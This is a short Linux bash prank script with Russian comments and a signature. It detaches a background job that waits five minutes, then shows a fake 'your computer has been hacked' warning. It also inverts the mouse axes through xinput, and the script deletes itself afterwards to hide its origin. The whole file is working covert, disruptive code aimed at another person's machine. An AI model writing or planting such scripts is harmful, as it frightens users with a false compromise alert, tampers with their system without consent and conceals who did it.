#!/bin/bash

# Предупредить и сделать инверсию мыши 🥰💀 P.S. С любовью, Bauka (basagitz)
nohup bash -c "
sleep 300; zenity --warning --text='Ваш компьютер был взломан, инверсия мыши включен' --title='WARNING!' --width=200 --height=40 &
xinput set-prop 14 'Coordinate Transformation Matrix' -1 0 1 0 -1 1 0 0 1
" > /dev/null 2>&1 & disown
rm -- "$0"